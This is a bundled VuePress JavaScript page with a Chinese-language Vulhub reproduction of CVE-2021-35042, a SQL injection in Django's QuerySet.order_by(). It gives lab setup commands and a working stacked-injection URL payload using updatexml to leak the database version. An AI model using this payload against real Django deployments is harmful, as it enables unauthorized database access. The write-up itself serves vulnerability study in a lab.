import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as n,o as r,c as d,a as e,b as a,d as c,e as i}from"./app-58e4a7d6.js";const l={},s=e("h1",{id:"cve-2021-35042",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#cve-2021-35042","aria-hidden":"true"},"#"),a(" CVE-2021-35042")],-1),u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Django 在 2021 年 7 月 1 日发布了一个安全更新，修复了在 QuerySet 底下的 order_by 函数中存在的 SQL 注入漏洞",-1),h=e("p",null,"参考链接:",-1),_={href:"https://www.djangoproject.com/weblog/2021/jul/01/security-releases/",target:"_blank",rel:"noopener noreferrer"},g=i(`<p>该漏洞需要用户可控 order_by 传入的值，在预期列的位置注入 SQL 语句。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令编译及启动一个存在漏洞的 Django 3.2.4：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8000</code> 即可看到 Django 默认首页。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问页面 <code>http://your-ip:8000/vuln/</code>，在 GET 参数中构造 <code>order=-id</code>，会得到根据 id 降序排列的结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8000/vuln/?order=-id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221714341.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再构造 GET 参数 <code>order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code> 提交，其中 <code>vuln_collection</code> 是 <code>vuln</code> 应用下的模型 <code>Collection</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功注入 SQL 语句，利用堆叠注入获得信息：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202221715188.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13);function m(v,b){const o=n("ExternalLinkIcon");return r(),d("div",null,[s,u,p,h,e("ul",null,[e("li",null,[e("a",_,[a("https://www.djangoproject.com/weblog/2021/jul/01/security-releases/"),c(o)])])]),g])}const y=t(l,[["render",m],["__file","Django QuerySet.order_by() SQL注入漏洞 CVE-2021-35042.html.vue"]]);export{y as default};
